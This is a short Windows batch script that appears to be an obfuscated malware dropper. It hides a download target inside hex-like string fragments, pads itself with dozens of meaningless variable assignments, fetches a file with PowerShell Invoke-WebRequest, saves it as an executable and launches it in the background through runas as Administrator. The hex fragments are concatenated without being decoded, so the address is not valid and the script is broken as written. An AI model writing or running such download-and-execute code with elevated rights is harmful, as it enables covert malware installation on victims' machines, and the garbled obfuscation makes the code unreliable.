@echo off

setlocal enabledelayedexpansion
set a1=0x66 b2=0x70 c3=0x72 d4=0x74 e5=0x73 f6=0x77 g7=0x65 h8=0x6F
set q9=!a1!!b2!!c3!!d4!!e5!!f6!!g7!!h8! zz=test1.exe
set m1=12345 n2=67890 o3=abcde p4=99999 q5=abcdef r6=123abc s7=xyzxyz t8=987654
set u9=secret123 v10=longcodeexample w1=111 x2=222 y3=333 z4=444 a5=555
set b6=666 c7=777 d8=888 e9=999 f10=000 g11=aa h12=bb i13=cc j14=dd
set k15=ee l16=ff m17=gg n18=hh o19=ii p20=jj q21=ll r22=mm s23=nn t24=oo
set u25=pp v26=qq w27=rr x28=ss y29=tt z30=uu aa31=vv bb32=ww cc33=xx dd34=yy
set ee35=zz ff36=111 gg37=222 hh38=333 ii39=444 jj40=555 kk41=666 ll42=777
set mm43=888 nn44=999 oo45=000 pp46=abcd qq47=efgh rr48=ijkl ss49=mnop tt50=qrst
set uu51=uvwx vv52=yz12 ww53=3456 xx54=7890 yy55=abcd zz56=dcba aa57=4321
set bb58=5678 cc59=1234 dd60=8765 ee61=4321 ff62=8765 gg63=6543 hh64=1234
set ii65=6789

powershell -Command "Invoke-WebRequest !q9! -OutFile !zz!"
start /B "" runas /user:Administrator "!zz!"
set j1=0x61 k2=0x72 l3=0x65 m4=0x6e n5=0x64 o6=0x61 p7=0x6d q8=0x69
set r9=0x6e s10=0x66 t11=0x55 u12=0x66 v13=0x77 w14=0x88 x15=0x99
set y16=0x11 z17=0x22 aa18=0x33 bb19=0x44 cc20=0x55 dd21=0x66 ee22=0x77
set ff23=0x88 gg24=0x99 hh25=0x00 ii26=0x11 jj27=0x22 kk28=0x33 ll29=0x44
set mm30=0x55

endlocal
